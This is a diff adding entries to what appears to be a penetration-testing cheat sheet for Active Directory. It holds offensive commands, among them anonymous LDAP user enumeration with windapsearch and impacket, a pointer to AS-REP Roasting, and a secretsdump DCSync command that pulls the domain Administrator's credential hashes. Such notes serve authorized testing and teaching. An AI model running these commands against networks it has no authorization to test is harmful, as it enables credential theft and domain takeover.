@@ -8,8 +8,22 @@ powershell -ep bypass
 
 About users (script for getting users)
 
-
 ## Manual
+
+Windapsearch form anonymous binds:
+```
+./windapsearch.py -d domain.com --dc-ip $rhost -U
+```
+
+### Enumerate Users
+```
+impacket-GetADUsers domain.com -dc-ip $rhost -debug
+```
+
+[Username anarchy - Tool for generating usernames when pentesting.](https://github.com/urbanadventurer/username-anarchy)
+
+If you have only users, you should try **AS-REP Roasting**.
+
 Enumerate Local Accounts on the machine:
 ```
 net user /domain
@@ -59,6 +73,14 @@ net group "Sales Department" /domain
 ## Silver Tickets
 
 ## Domain Controller Synchronization
+
+With impacket:
+```
+secretsdump.py domain.com/username@$rhost -just-dc-user Administrator
+```
+
+with mimikatz:
+
 
 # Lateral Movement
 
